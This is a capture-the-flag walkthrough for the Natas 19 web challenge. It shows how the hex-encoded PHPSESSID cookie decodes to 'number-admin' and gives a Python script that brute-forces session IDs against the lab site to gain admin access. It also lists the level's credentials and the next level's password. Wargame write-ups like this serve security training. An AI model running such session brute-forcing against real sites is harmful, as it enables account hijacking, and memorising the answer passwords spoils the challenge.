# Natas 18 - Natas 19
    Username  : natas19
    Password  : tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr
    URL       : http://natas19.natas.labs.overthewire.org

# Solution
Here, we don’t have the source code but the challeng says : 
“This page uses mostly the same code as the previous level, but session IDs are no longer sequential…“. 

Let’s take a look at our cookie 
    
    Cookie: PHPSESSID=3235352d61646d696e
    
looks like ASCII, let’s decode it :

    255-admin

So it can be any integer - admin

Python script fo above brute forcing : 
```
import requests

url = "http://natas19.natas.labs.overthewire.org/"
auth = ("natas19", "tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr")  # replace with your Level 19 password

for i in range(640):
    session = f"{i}-admin"
    hex_session = session.encode().hex()

    cookies = {"PHPSESSID": hex_session}
    print(hex_session)
    r = requests.get(url, auth=auth, cookies=cookies)

    if "You are an admin" in r.text:
        print(f"[+] Found! Session: {session}")
        print(r.text)
        break
```

# Password
      p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw
